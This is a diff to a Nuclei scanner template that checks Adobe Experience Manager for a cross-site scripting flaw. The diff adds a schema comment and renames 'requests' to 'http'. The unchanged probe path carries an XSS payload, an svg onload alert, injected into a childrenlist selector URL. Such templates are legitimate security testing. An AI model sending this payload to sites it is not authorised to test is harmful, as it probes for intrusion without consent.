@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: aem-xss-childlist-selector
 
 info:
@@ -14,7 +15,7 @@ info:
       - http.component:"Adobe Experience Manager"
   tags: xss,aem,adobe
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'
